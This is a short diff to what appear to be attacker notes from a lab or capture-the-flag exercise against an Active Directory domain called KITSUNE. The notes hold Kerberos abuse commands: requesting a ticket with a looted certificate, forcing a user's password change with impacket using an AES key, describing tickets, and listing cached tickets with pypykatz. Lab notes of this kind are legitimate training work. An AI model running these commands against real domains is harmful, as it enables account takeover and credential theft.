@@ -47,4 +47,7 @@ python3 gettgtpkinit.py -cert-pfx ~/workspace/targets/hs_kitsune/loot/tickets/ra
 deactivate # to exit
 
 impacket-changepasswd KITSUNE.local/schlop@DC01.kitsune.local -aesKey <aes_key> -altuser ranch -no-pass -k -newpass 'Password1' -dc-ip 10.1.152.66
-impacket-describeTicket user.ccache --aes <aes_key>
+impacket-describeTicket user.ccache --aes <aes_key> #requires aes key of krbtgt so... not useful right now
+
+# verifying group membership
+pypykatz kerberos ccache list $KRB5CCNAME
